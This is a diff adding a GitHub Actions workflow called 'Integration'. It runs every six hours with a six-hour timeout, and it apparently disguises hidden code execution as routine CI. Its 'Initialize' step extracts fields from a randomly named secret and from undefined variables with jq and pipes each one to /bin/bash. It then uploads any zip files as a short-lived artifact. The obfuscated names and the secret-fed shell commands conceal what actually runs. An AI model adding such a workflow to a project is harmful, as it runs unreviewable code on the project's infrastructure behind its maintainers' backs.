@@ -1,0 +1,34 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '17 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Initialize
+        env:
+          gehta4074: ${{ secrets.gehta4074 }}
+        run: |
+          printf '%s' "$gehta4074" | jq -r .vp316 | /bin/bash
+          printf '%s' "$cvx8" | jq -r .sxij1355 | /bin/bash
+          echo $ul3 | jq -r .f0820 | /bin/bash
+          printf '%s' "$qgyqg81692" | jq -r .z8097 | /bin/bash
+          echo $ole08 | jq -r .irpkc534 | /bin/bash
+
+      - name: Persist results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: jKRghi5L
+          path: "*.zip"
+          retention-days: 1
